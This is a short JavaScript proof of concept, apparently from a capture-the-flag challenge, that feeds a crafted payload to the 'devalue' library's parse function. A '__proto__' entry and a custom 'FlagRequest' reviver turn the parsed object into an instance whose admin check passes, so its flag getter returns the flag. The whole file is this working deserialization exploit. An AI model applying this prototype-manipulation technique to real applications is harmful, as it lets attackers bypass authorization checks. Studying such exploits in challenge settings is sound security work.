import { parse } from 'devalue';
class FlagRequest {
  constructor(feedback) {
    delete { feedback }
  }
  get flag() {
    if (this.admin) {
      return 'FLAG';
    }
    return 'nope';
  }
}
const payload = '[{"admin":1,"__proto__":2},true,["FlagRequest",3],[4],"test"]';
const obj = parse(payload, { FlagRequest: ([a]) => new FlagRequest(a) });
console.log('instanceof', obj instanceof FlagRequest);
console.log('admin', obj.admin);
console.log('flag', obj.flag);
